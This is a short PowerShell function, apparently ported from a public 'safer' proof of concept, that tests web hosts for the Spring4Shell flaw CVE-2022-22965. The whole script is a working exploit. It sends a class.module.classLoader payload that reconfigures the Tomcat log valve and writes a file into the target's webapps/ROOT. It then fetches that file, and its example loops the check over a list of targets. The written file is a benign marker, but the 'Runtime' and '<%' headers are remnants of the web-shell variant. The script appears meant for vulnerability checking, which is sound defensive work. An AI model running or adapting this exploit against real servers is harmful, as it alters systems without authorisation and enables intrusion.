function Invoke-CVE202222965-SafeCheck {
    <#
    .SYNOPSIS
        CVE-2022-22965 PowerShell check. Ported to PowerShell from origin creator: 'colincowie', who has produced a python version.
        Url to original project: https://github.com/colincowie/Safer_PoC_CVE-2022-22965

    .EXAMPLE
        $Output = Get-Content targets.txt | ForEach-Object { Invoke-CVE202222965-SafeCheck -Url "https://$_" }
        $Output | Where-Object {$_.file_content -match 'CVE_2022_22965'}
    
    .NOTES
        PowerShell port of: https://github.com/colincowie/Safer_PoC_CVE-2022-22965

    .PARAMETER Url
        Input IP/hostname to check against.

    #>
    [CmdletBinding()]
    [OutputType([psobject])]
    param(
        [Parameter(Mandatory=$true, ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true)]
        [string] $Url,

        [Parameter(Mandatory=$false, ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true)]
        [string] $Directory='webapps/ROOT'
    )

    $RequestData = @{
        Uri = $Url
        Method = 'Post'
        ContentType = 'application/x-www-form-urlencoded'
        Body = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=i%20Warning,%20CVE_2022_22965%20was%20sucessfully%20exploited%20on%20this%20device.%20reference:%20https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement%20%20i&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.txt&class.module.classLoader.resources.context.parent.pipeline.first.directory=$($Directory)&class.module.classLoader.resources.context.parent.pipeline.first.prefix=CVE_2022_22965_exploited&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
        Headers = @{
            "suffix"    = '%>//'
            "c1"        = 'Runtime'
            "c2"        = '<%'
            "DNT"       = '1'
        }
    }

    # Performs the requests: 
    $RequestToInjectFile = Invoke-WebRequest @RequestData -SkipCertificateCheck -SkipHttpErrorCheck -SkipHeaderValidation -TimeoutSec 10 -ErrorAction SilentlyContinue
    $RequestToReadFile = Invoke-WebRequest -Method Get -Uri ($Url + '/CVE_2022_22965_exploited.txt') -SkipCertificateCheck -SkipHttpErrorCheck -SkipHeaderValidation -TimeoutSec 10 -ErrorAction SilentlyContinue

    # Output:
    [PSCustomObject]@{
        url                     = $Url
        injection_http_code     = $RequestToInjectFile.StatusCode
        file_content            = $RequestToReadFile.Content
    }
}

